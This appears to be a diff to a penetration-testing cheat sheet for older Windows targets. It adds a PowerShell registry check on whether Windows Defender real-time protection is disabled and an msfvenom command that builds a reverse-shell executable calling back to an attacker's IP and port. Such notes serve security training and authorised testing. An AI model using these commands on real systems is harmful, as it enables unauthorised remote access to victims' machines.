@@ -1,6 +1,16 @@
-version < Windows 10 20H2 (Build 19042)
+#### Conditions
 
-reverse shell
+version < Windows 10 20H2 (Build 19042)
+checking if Windows Defender is active
+
+```powershell
+# Disabled:1
+get-item 'hklm:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection\'
+```
+
+#### Steps
+
+create reverse shell
 
 ```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f exe -o rev.exe
